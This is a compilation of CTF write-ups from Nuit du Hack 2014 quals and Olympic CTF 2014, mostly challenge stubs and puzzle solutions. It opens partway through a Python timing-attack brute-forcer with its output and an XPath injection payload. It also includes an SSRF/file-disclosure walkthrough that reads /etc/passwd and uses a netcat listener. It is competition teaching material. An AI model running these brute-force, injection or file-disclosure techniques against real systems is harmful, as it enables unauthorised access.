      if timer >= self.trigger:
        stop = default_timer()
        print("[+] Possible valid UID: %d found in %d seconds." % (userid,(stop-start)))
        # We check if the userid is a false positive.
        self.confirm(userid)
    print("[+] Timing attack done.")

  def send_exploit(self, user_id):
    # We send a payload, and get the time it needs to answer.
    sock = self.create_socket()
    self.send_payload(sock,user_id)
    start = default_timer()
    data = sock.recv(1024)
    stop = default_timer()
    sock.close()
    return (stop-start)

  def confirm(self,uid):
    # This function is used to test if a userid is valid.
    success = 0
    for attempt in range(0,20):
      took = self.send_exploit(uid)
      print("[~] Test n°%d: %f" % (attempt,took))
      if (took >= self.trigger):
        print("[+] BANGARANG!")
        success += 1
      else:
        print("[-] Nooooooo!")
    success_rate = float(success)/20*100
    print("[~] Test results: %d seems to be %f%% valid." % (uid,success_rate))
    if success_rate >= 50:
      print("[+] User ID: %d doesn't seem to be a false positive." % uid)
      while True:
        password = raw_input("Enter password (cancel with 'quit')\nNightlysploit $> ")
        if password == "quit": break
        self.establish_connection(uid,password)

  def establish_connection(self,uid,password):
    # This function is used to test if a username is valid.
    sock = self.create_socket()
    print("[~] Sending get_challenge")
    sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, password))
    challenge = sock.recv(1024)
    sock.close()
    print("[~] Got challenge... Sending auth.")
    # We send the auth 5 times because of load-balancing.
    for x in range(0,5):
      sock = self.create_socket()
      sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, password, challenge))
      response = sock.recv(1024)
      if (response == "You were kicked by the NightlyAUTH Server. Reason: Authentification failed.\n"):
        print("[~] Auth failed...")
      else:
        print("[+] Server answered: %s" % response)

  def chunks(self, l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

  def send_payload(self,sock,uid):
    counter = 0
    #      OPCODE       UID         PASS
    sock.sendall("1\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01" % (uid,"ninja"))
    for data in self.chunks(self.payload,980):
      counter += 1
      sock.sendall(data)
    # END OF STREAM
    sock.sendall("\x45\x4f\x53")

if __name__ == "__main__":
  boom = TimingAttack(("54.217.202.218",1337))
  print("[~] Discovering average response time...")
  boom.avg_timer()
  print("[~] Bruteforcing...")
  boom.bruteforce()
```

After **8 minutes** on a cheap VPS server, we get the following result:

```
[~] Uid: 3240 took: 0.068480 (32% completed)
[~] Uid: 3241 took: 0.069281 (32% completed)
[~] Uid: 3242 took: 0.069874 (32% completed)
[~] Uid: 3243 took: 0.224517 (32% completed)
[+] Possible valid UID: 3243 found in 484 seconds.
[~] Test n°0: 0.215680
[+] BANGARANG!
[~] Test n°1: 0.217219
[+] BANGARANG!
[~] Test n°2: 0.208675
[+] BANGARANG!
[~] Test n°3: 0.199905
[+] BANGARANG!
[~] Test n°4: 0.229774
[+] BANGARANG!
[~] Test n°5: 0.208620
[+] BANGARANG!
[~] Test n°6: 0.193230
[+] BANGARANG!
[~] Test n°7: 0.204750
[+] BANGARANG!
[~] Test n°8: 0.215756
[+] BANGARANG!
[~] Test n°9: 0.211181
[+] BANGARANG!
[~] Test n°10: 0.196094
[+] BANGARANG!
[~] Test n°11: 0.213732
[+] BANGARANG!
[~] Test n°12: 0.197914
[+] BANGARANG!
[~] Test n°13: 0.195056
[+] BANGARANG!
[~] Test n°14: 0.210873
[+] BANGARANG!
[~] Test n°15: 0.201116
[+] BANGARANG!
[~] Test n°16: 0.218596
[+] BANGARANG!
[~] Test n°17: 0.216802
[+] BANGARANG!
[~] Test n°18: 0.215007
[+] BANGARANG!
[~] Test n°19: 0.222972
[+] BANGARANG!
[~] Test results: 3243 seems to be 100.000000% valid.
[+] User ID: 3243 doesn't seem to be a false positive.
Enter password (cancel with 'quit')
Nightlysploit $>
```

We can see a **big** difference between a bad user ID and a good user ID. (+0.15 seconds) If the network is *unstable*, we just have to raise the number of zeroes to compress.

Ok, we have a good user id, but we don’t have a password. Let’s see if we can enter a random password…

```
Nightlysploit $> nico
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
```

Ok, it doesn’t work. Let’s try with something more… **agressive**.

```
Nightlysploit $> "'��u("'�f"�ht"
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```

Something happened! Maybe it’s the quotes… After trying a single quote, it seems that a double quote is making the server behave strangely. Could this be SQL injection?

```
Nightlysploit $> " OR 1=1 OR "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```

Nope, it makes the application behave strangely too… It looks like SQL, but it isn’t. Maybe it’s XPath? Let’s retry the earlier injection with lowercase characters.

```
Nightlysploit $> " or 1=1 or "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered: The flag is: D34RG0DILUVC00KIEZ
```

Boom. The flag is `D34RG0DILUVC00KIEZ`.

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Qualifications: Onion Rings

**Category:** Miscellaneous
**Points:** 150
**Description:**

> A new black market has appeared and has been targeted by the FBI. After checking for suspicious posts on stackoverflow and finding nothing, they give up and are offering a bounty to anyone who can get information on the server that is hosting the hidden service.
>
> http://mq72g4732yorslzf.onion/

## Write-up

`.onion` URLs can only be visited through the Tor network. After firing up Tor and browsing around for a bit, <http://mq72g4732yorslzf.onion/upload.php> seems vulnerable to file disclosure. Entering `file:///etc/passwd` in the URL field results in the following HTML after submitting the form:

```html
…
<img src="data:image/gif;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovYmluL3NoCmJpbjp4OjI6MjpiaW46L2JpbjovYmluL3NoCnN5czp4OjM6MzpzeXM6L2RldjovYmluL3NoCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L2Jpbi9zaAptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovYmluL3NoCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi9iaW4vc2gKbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovYmluL3NoCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L2Jpbi9zaAp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L2Jpbi9zaApwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L2Jpbi9zaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi9iaW4vc2gKYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovYmluL3NoCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L2Jpbi9zaAppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L2Jpbi9zaApnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L2Jpbi9zaApub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi9iaW4vc2gKbGlidXVpZDp4OjEwMDoxMDE6Oi92YXIvbGliL2xpYnV1aWQ6L2Jpbi9zaApEZWJpYW4tZXhpbTp4OjEwMToxMDM6Oi92YXIvc3Bvb2wvZXhpbTQ6L2Jpbi9mYWxzZQpzdGF0ZDp4OjEwMjo2NTUzNDo6L3Zhci9saWIvbmZzOi9iaW4vZmFsc2UKc3NoZDp4OjEwMzo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpudHA6eDoxMDQ6MTA2OjovaG9tZS9udHA6L2Jpbi9mYWxzZQpkZWJpYW4tdG9yOng6MTA1OjEwODo6L3Zhci9saWIvdG9yOi9iaW4vZmFsc2UKbXlzcWw6eDoxMDY6MTA5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=">
…
```

Base64-decoding that reveals the contents of the file, in this case `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:104:106::/home/ntp:/bin/false
debian-tor:x:105:108::/var/lib/tor:/bin/false
mysql:x:106:109:MySQL Server,,,:/nonexistent:/bin/false
```

Entering a non-existent file or directory path results in the following:

```html
<img src="data:image/gif;base64,">
```

Entering a valid directory path or the path to a file larger than 2.7 KB results in:

```html
The maximum image size is 2.7kb, yunno, for the cookies.
```

Let’s try entering `file:///etc/hosts` to see what `/etc/hosts` looks like:

```
127.0.0.1 localhost.localdomain localhost
192.168.99.22 quals.hackerzvoice.net quals
212.83.153.197 quals.hackerzvoice.net quals

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Visiting <http://quals.hackerzvoice.net/> in a regular browser doesn’t reveal anything interesting, but this configuration shows that when the server running the Onion Rings website accesses that hostname, it will resolve to a local IP address in the same network. So let’s see what the main page says by entering `http://quals.hackerzvoice.net/` in the URL field. The [resulting HTML page can be viewed here](blog.html). It contains the following:

> He started screaming at me saying weird shit I didn’t understand, then he just lookde blank and mumbled: “The flag .. The flag.. It is ’0hSh1t1r4n0ut0fn00dl35′. And then he just died in front of me. Weird..

The flag is `0hSh1t1r4n0ut0fn00dl35`.

## Additional information

At first I thought the flag would be hidden in the source code of the Onion Rings website itself. The `/etc/passwd` file (see above) hints that Apache is used, but the `/var/www/html/` directory (the default on most installations) didn’t seem to exist.

To figure out the correct path, let’s look at `/etc/apache2/ports.conf`:

```
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default
# This is also true if you have upgraded from before 2.2.9-3 (i.e. from
# Debian etch). See /usr/share/doc/apache2.2-common/NEWS.Debian.gz and
# README.Debian.gz

NameVirtualHost *:80
Listen 80
Listen 8056

<IfModule mod_ssl.c>
    # If you add NameVirtualHost *:443 here, you will also have to change
    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
    # to <VirtualHost *:443>
    # Server Name Indication for SSL named virtual hosts is currently not
    # supported by MSIE on Windows XP.
    Listen 443
</IfModule>

<IfModule mod_gnutls.c>
    Listen 443
</IfModule>
```

The header comment points to `/etc/apache2/sites-enabled/000-default`. Let’s see what’s in there:

```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www/blog
    <Directory />
        Options FollowSymLinks
        AllowOverride None
    </Directory>
    <Directory /var/www/blog/>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride None
        Order allow,deny
        allow from all
    </Directory>

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Order allow,deny
        Allow from all
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn

    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:8056>
    ServerName mq72g4732yorslzf.onion
    DocumentRoot /var/www/onion_rings
</VirtualHost>
```

This reveals that the server hosts a blog (the one we found the flag on) from the `/var/www/blog/` directory, and the Onion Rings website from `/var/www/onion_rings`.

Looking at `/var/www/blog/index.php` it’s obvious that the blog is powered by WordPress. I tried looking at `/var/www/blog/wp-config.php` and `/var/www/wp-config.php` but those files didn’t exist.

Most of the files in `/var/www/onion_rings` could be retrieved; others couldn’t because they were too large. [They’re in the `source` folder](source) if you’re curious, but note that these files were not helpful at all for getting the flag.

## Alternate approach

Another approach would be to enter a URL on a server under your control.

Start [Netcat](http://netcat.sourceforge.net/) or [Ncat](http://nmap.org/ncat) on your host to listen on port 80 (attention: your host should _not_ be behind NAT):

```bash
$ nc -vlp 80 # or use `netcat`
```

Then, on the Onion Rings website, enter the URL e.g. `http://your-host.example.com/1.jpg` and look for the IP of the Onion Rings server.

```
Ncat: Version 6.25 ( http://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 212.83.153.197.
Ncat: Connection from 212.83.153.197:54869.
GET /1.jpg HTTP/1.1
Host: your-host.example.com
Accept: */*
```

The IP address is clearly `212.83.153.197`. Visiting `http://212.83.153.197/` shows [the blog we’ve discussed before](blog.html), which contains the flag.

## Other write-ups and resources

* <http://csrc.tamuc.edu/css/?p=116>
* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#onion-rings>
* <http://tasteless.eu/2014/04/nuit-du-hack-ctf-quals-2014-misc150-and-misc200-writeup/>
* <http://lockboxx.blogspot.de/2014/04/nuit-du-hack-2014-quals-ctf-writeup.html>
# Nuit du Hack CTF Qualifications: PsCrypto

**Category:** Crypto
**Points:** 250
**Description:**

> Here is a new cloud service named "PsCrypto™ ", it is used by many influental people. You can access your data with the login :"ulysse" and the password "penelope". The server adress is 54.217.202.218 and the port is 2609.
>
> A friend just gave you a file named "dump_users_ps.txt", in this file you have a small list of PsCrypto™ users.
>
> Your mission is to find the flag stored in a file of a specific user.
>
> [`pscrypto.tar.gz`](pscrypto.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.botbie.com/2014/04/06/nuit-du-hack-pscrypto-crypto250/>
# Nuit du Hack CTF Qualifications

* <http://quals.nuitduhack.com/>
* [Scoreboard](http://quals.nuitduhack.com/users) or [local alternative](scoreboard.txt)

## Completed write-ups

* [Here, kitty kitty!](here-kitty-kitty)
* [Nightly Auth](nightly-auth)
* [Onion Rings](onion-rings)

## External write-ups only

* [Abitbol](abitbol)
* [Another One](another-one)
* [Big Momma](big-momma)
* [Carbonara](carbonara)
* [Data extraction](data-extraction)
* [GodMode](godmode)
* [Nibble](nibble)
* [PsCrypto](pscrypto)
* [The greatest](the-greatest)
* [Titanoreine](titanoreine)
* [Windows Forensics](windows-forensics)
* [Worthless](worthless)

## Missing write-ups

* [Yutu](yutu)
# Nuit du Hack CTF Qualifications: The greatest

**Category:** Steganalysis
**Points:** 500
**Description:**

> We are sure that this e-mail contains hidden information, go get it!
>
> [`mail.tar`](mail.tar)

## Write-up

(TODO)

## Other write-ups and resources

* <http://wiki.yobi.be/wiki/NDH_Writeups#The_greatest>
# Nuit du Hack CTF Qualifications: Titanoreine

**Category:** Web
**Points:** 300
**Description:**

> This week, a new image hosting website opened. The admin, afraid he might forget his access codes, created a file with credentials on the server. Your goal is to find the file to retrieve his password.
>
> <http://gallery.nuitduhack.com/>

## Write-up

(TODO)

The flag is `WhyAreHemorrhoidsNotCalledAssteroids`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-web-write-ups/>
* <http://tasteless.eu/2014/04/nuit-du-hack-ctf-quals-2014-web100-and-web300-writeup/>
# Nuit du Hack CTF Qualifications: Windows Forensics

**Category:** Forensics
**Points:** 200
**Description:**

> On a client computer of a merchandise transport company, an employee realized that a command prompt containing commands appeared on the screen. The company contacted NianSec, a computer security company to assess the risk. John, trainee, was tasked to retrieve the memory of the windows system. By mistake, he only extracted the pagefile of the system before turning off the machine. You must retrace the attack and understand what happened on the machine.
>
> [`pagefile.sys.7z`](pagefile.sys.7z)

## Write-up

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#windows-forensics>
# Nuit du Hack CTF Qualifications: Worthless

**Category:** Crypto
**Points:** 50
**Description:**

> Hi,
>
> We just received an encrypted message from a weird man. None of our NSA agents know what it is. You have to find the decyphered message.
>
> [`Worthless.txt`](Worthless.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-crypto-write-ups/>
# Nuit du Hack CTF Qualifications: Yutu

**Category:** Web
**Points:** 400
**Description:**

> Yutu, a chinese robot, is on again. You must use the ultra secure website of Yutu to recover classified data.
>
> <http://54.217.202.218:4242/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Olympic CTF 2014: 20Lines

**Category:** Nopsleigh (Pwn)
**Points:** 500
**Author:** vos
**Description:**

> [Twenty Lines of Buttpain](20lines.c).
>
> ```bash
> nc 109.233.61.11 2020
> ```
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: [The exact binary running on the server](easy.bin)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Olympic CTF 2014: As seen on DEFCON

**Category:** Nopsleigh (Pwn)
**Points:** 10
**Author:** snk
**Description:**

> `EBFE` is to x86 as **____** is to ARM64.

## Write-up

This is a reference to [DEF CON 2006’s trivia challenge](http://nopsr.us/ctf2006prequal/walk-trivia.html#500) which went like this:

> `EBFE` is to x86 as **____** is to PowerPC.

This time we have to find the ARM64 equivalent. Let’s see what kind of instruction `EBFE` is:

```bash
$ echo -ne '\xEB\xFE' | ndisasm -
00000000  EBFE              jmp short 0x0
```

Okay, so `\xEB\xFE` is a `jmp` instruction. ARM doesn’t have `jmp` instructions though — [it uses `b` instructions (branches) instead](http://www.heyrick.co.uk/armwiki/B). Let’s see which opcode `b` maps to:

```bash
$ echo 'b .' | aarch64-linux-gnu-as
$ aarch64-linux-gnu-objdump -d a.out

a.out:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   14000000        b       0 <.text>
```

So the 32-bit instruction word for `b` is `0x14000000`. Since ARM64 is little-endian, this becomes `00000014`.

The answer is `00000014`.

## Other write-ups and resources

* <http://cybersecurity.cci.fsu.edu/olympic-ctf-2014-writeup/>
* <https://ctftime.org/writeup/927>
* <http://ctfwriteups.blogspot.jp/2014/02/olympic-ctf-2014-nopsleigh-10-as-seen.html>
* [Chinese](http://ddaa.logdown.com/posts/178446-olympic-ctf-2014-10-point-summary)
# Olympic CTF 2014: Aski

**Category:** Binathlon (Bin)
**Points:** 300
**Author:** pzbitskiy
**Description:**

> Download: [`aski`](aski)
>
> HINT1: Check 10 + 25\*i
>
> HINT2: pzbitskiy@aski:~$ cat /etc/issue
>
> Ubuntu 13.04 \n \l

## Write-up

(TODO)

The flag is `CTF+WINT3R+S3A50N`.

## Other write-ups and resources

* <http://ctfcrew.org/writeup/25>
# Olympic CTF 2014: Crypting

**Category:** Figure Crypting (Crypto)
**Points:** 10
**Author:** touzoku
**Description:**

> 43wdxz 4edcvgt5 65rdcvb 6tfcgh8uhb 9ijn

## Write-up

The given ciphertext is a keyboard map. The shape of each group of characters on a US QWERTY keyboard spells out a single letter.

* `43wdxz` → `S`
* `4edcvgt5` → `O`
* `65rdcvb` → `C`
* `6tfcgh8uhb` → `H`
* `9ijn` → `I`

The flag is ‘sochi’.

## Other write-ups and resources

* <http://cybersecurity.cci.fsu.edu/olympic-ctf-2014-writeup/>
* <http://maroueneboubakri.blogspot.de/2014/02/olympic-ctf-sochi-2014-crypt-100-writeup.html>
* <http://onthesystemsoftheworld.blogspot.de/2014/02/olympic-ctf-sochi-2014-crypting-10.html>
* <http://delimitry.blogspot.ru/2014/02/olympic-ctf-2014-writeups.html>
* <http://ctfwriteups.blogspot.jp/2014/02/olympic-ctf-2014-figure-crypting-10.html>
* [Chinese](http://ddaa.logdown.com/posts/178446-olympic-ctf-2014-10-point-summary)
# Olympic CTF 2014: Echof

**Category:** Nopsleigh (Pwn)
**Points:** 300
**Author:** hellman
**Description:**

> pwn this. FILE: [task](task)
>
> ```bash
> nc 109.233.61.11 3129
> ```
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups and resources

* <http://balidani.blogspot.hu/2014/02/olympic-ctf-pwn300-echof-writeup.html>
* <http://j00ru.vexillium.org/dump/ctf/echof.py>
* [Chinese](http://217.logdown.com/posts/178721-olympic-ctf-2014-nopsleigh-300-echof-writeup)
# Olympic CTF 2014: Elf Quest 2

**Category:** Binathlon (Bin)
**Points:** 200
**Author:** hellman
**Description:**

> Tribute to Leet More 2010’s Elf Quest. Hope you are good at guessi… err, reversing! [`elfquest2`](elfquest2)
>
> HINT1: there are 3 stages
>
> HINT2: You need only first 20902 bytes of 32000
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{bf7475cb1733885d35b60e13bc2d7b8f}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/02/olympic-ctf-sochi-2014-elf-quest-2-writeup/>
* <http://penthackon.wechall.net/ctf_writeups/Olympic%20CTF%202014/ElfQuest2.htm>
# Olympic CTF 2014: Emdee

**Category:** CURLing (Web)
**Points:** 300
**Author:** vos
**Description:**

> [md5<sup>-1</sup>("40288d60073775070a7edcdcd1df9c56") = ?](http://109.233.61.11:34380/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/#curling300emdee>
* [Source (released after the CTF)](source.php)
# Olympic CTF 2014: Find da Key

**Category:** Freestyle (Misc.)
**Points:** 200
**Author:** vos
**Description:**

> Task is very unusual: find the key. [`stego.txt`](stego.txt)

## Write-up

(TODO)

The flag is `Base_sixty_four_point_five`.

## Other write-ups and resources

* <http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html>
* <http://sakura.pri-vate.net/tmp/writeup-olympicCTF2014-Free200.txt>
# Olympic CTF 2014: GuessGame

**Category:** Figure Crypting (Crypto)
**Points:** 300
**Author:** hellman
**Description:**

> Be careful, it’s cheating!
>
> ```bash
> nc 109.233.61.11 3126
> ```
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/olympic-ctf-2014-guessgame-300/>
* <http://pastebin.com/1CGaPkTm>
* [Chinese](http://217.logdown.com/posts/178428-olympic-ctf-2014-figure-crypting-300-guessgame-writeup)
# Olympic CTF 2014: HackMe

**Category:** Binathlon (Bin)
**Points:** 400
**Author:** psb
**Description:**

> Back to the 90th, [HackMe.tap](HackMe.tap).
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{A394F49FA76CC8D09AA2C7770F5FFEAE}`.

## Other write-ups and resources

* <http://www.0xebfe.net/blog/2014/02/09/olympicctf-binathlon-400-writeup/>
* <https://www.youtube.com/watch?v=XWozhb1ZOyM>
* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-binathlon-400-podcast.html>
* <http://gynvael.coldwind.pl/?id=527>
* <http://penthackon.wechall.net/ctf_writeups/Olympic%20CTF%202014/HackMe.htm>
# Olympic CTF 2014: HFMS

**Category:** CURLing (Web)
**Points:** 500
**Author:** kyprizel, tracer.tong
**Description:**

> We found some [hockey field management system](http://109.233.61.11:11180/). Get the flag?
>
> _Flag format: `CTF{..32 hexes..}`_
>
> HINT1: are there any other users than "admin"?
>
> HINT2: use Burp Suite to get inside
>
> Start with username: debug

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/02/14/olympic-ctf-curling500-write-up/>
* <http://penthackon.wechall.net/ctf_writeups/Olympic%20CTF%202014/HFMS.htm>
# Olympic CTF 2014: Illegal Radio

**Category:** Freestyle (Misc.)
**Points:** 300
**Author:** psb
**Description:**

> We found illegal radio transmissions and saved them into [dump](OLYMPIC-CTF.FM - 133.37MHz - IQ_Data.flac) for you. Please check it for data leakage.
>
> _Flag format: `CTF{..32 hexes..}`_
>
> HINT1: [https://dl.dropboxusercontent.com/u/45174825/olympics.png](olympics.png)
>
> HINT2: You know that it’s FM radio transmission / IQ data dump.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-illegal-radio.html>
# Olympic CTF 2014: Just No One

**Category:** Binathlon (Bin)
**Points:** 10
**Author:** vos
**Description:**

> Here’s your binary: [`setup.exe`](setup.exe)

## Write-up

The provided `setup.exe` file is a standard installation wizard.

![](setup-1.png)

As usual with these wizards, the second screen contains a very long license agreement that must be accepted before continuing the installation.

![](setup-2.png)

The next screen prompts for a password. Which password? Hmm… It’s possible to [crack it](http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-binathlon-10.html) and then proceed with the installation, but that doesn’t really help, because when the executable is opened, it just repeats “You already saw the flag.”:

![You already saw the flag.](executable.png)

And indeed — after running `setup.exe` again and carefully reading the license agreement this time, we notice something unusual:

![7A. YOU MAY SUBMIT THIS TO GET TEN POINTS: ILOVEREADINGEULAS.](setup-4.png)

The flag is `ILOVEREADINGEULAS`.

## Other write-ups and resources

* <http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-binathlon-10.html>
* <https://ctftime.org/writeup/926>
* <http://cybersecurity.cci.fsu.edu/olympic-ctf-2014-writeup/>
* <http://delimitry.blogspot.ru/2014/02/olympic-ctf-2014-writeups.html>
* <http://ctfwriteups.blogspot.jp/2014/02/olympic-ctf-2014-binathlon-10-just-no.html>
* [Chinese](http://ddaa.logdown.com/posts/178446-olympic-ctf-2014-10-point-summary)
# Olympic CTF 2014: LHC

**Category:** Nopsleigh (Pwn)
**Points:** 400
**Author:** vos
**Description:**

> Gain access to 109.233.61.11:30483. As of our previous intrusion effort, we’ve got a previous version of the binary. Currently they are running a more advanced one, but hey - it’s better than nothing: [`lhc_old`](lhc_old).
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups and resources

* <http://geohot.com/lhcwriteup.html>
# Olympic CTF 2014: Make similar

**Category:** Freestyle (Misc.)
**Points:** 400
**Author:** psb
**Description:**

> [Listen](similar.ogg) carefully and try to figure out. Hint: 120 LPM
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

The “120 LPM” hint refers to [weather fax](http://en.wikipedia.org/wiki/Radiofax), an analog mode for transmitting monochrome images.

There’s an OS X application called [Multimode](http://www.blackcatsystems.com/software/multimode/fax.html#HOWREC) which can be used to convert the audio back into the original fax images. It only accepts WAV files as input though, so first I converted [`similar.ogg`](similar.ogg) to `similar.wav` using Audacity. The result looks something like this:

![](fax.jpg)

The text is the following:

```
section 1 of 1 of file rfax_man
begin 644 rfax_man
h5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24
hcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd
hLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr
h26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx
hg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ
hksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28
hyeth+l2I0gPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa
hPG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C
hxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5
h87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ
hnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx
hp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yv1S62v+k++
+
end
sum —r/size 7468/769 section (from "begin" to "end")
sum —r/size 36513/540 entire input file
```

This looks like [xxencoded](http://en.wikipedia.org/wiki/Xxencoding) text. Let’s [decode it using an online xxdecoder](http://www.webutils.pl/XXencode). This results in a file named `rfax_man`. What could it be?

```bash
$ file rfax_man
rfax_man: gzip compressed data, was "rfax_man.py", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed
```

It’s gzip-compressed data! Let’s find out what it is:

```bash
$ gunzip < rfax_man > rfax_man_unzipped
```

It seems `rfax_man_unzipped` is a Python script:

```python
import socket,os,sys,hashlib

